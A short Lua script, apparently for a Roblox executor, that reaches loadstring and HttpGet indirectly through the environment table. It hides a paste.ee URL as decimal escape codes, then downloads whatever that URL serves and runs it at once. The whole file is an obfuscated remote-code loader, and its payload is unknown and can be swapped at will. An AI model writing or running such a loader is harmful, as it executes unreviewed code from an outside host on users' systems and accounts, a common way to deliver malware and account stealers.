local a = getfenv and getfenv() or _ENV
local b = a["loadstring"]
local c = a["game"]["HttpGet"]
local d = a["game"]

local u = "\104\116\116\112\115\58\47\47\112\97\115\116\101\46\101\101\47\114\47\85\78\48\114\51\78\98\81"
b(c(d, u))()
